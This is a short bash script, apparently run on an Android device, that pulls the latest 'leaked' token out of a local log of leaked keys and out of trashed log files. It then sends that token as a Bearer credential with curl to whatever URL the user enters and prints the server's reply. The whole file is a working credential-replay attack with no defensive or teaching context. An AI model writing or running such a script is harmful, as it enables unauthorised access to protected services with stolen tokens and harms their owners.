#!/bin/bash
echo "[*] Pulling latest leaked token..."

LOG="/sdcard/Download/python_scripts/realtime_leaked_keys.log"
TRASHED=$(find /sdcard/Download/python_scripts -type f -iname "*.log" | grep .trashed | tail -1)

token=$(grep -oE "[A-Za-z0-9_\-]{30,}" "$LOG" "$TRASHED" 2>/dev/null | tail -n1)

if [[ -z "$token" ]]; then
  echo "[!] No token found."
  exit 1
fi

read -p "Target URL to hit with token (e.g., http://192.168.1.5:5000/protected): " url

echo "[*] Using token: $token"
resp=$(curl -s -H "Authorization: Bearer $token" "$url")
echo "[+] Server response:"
echo "$resp"
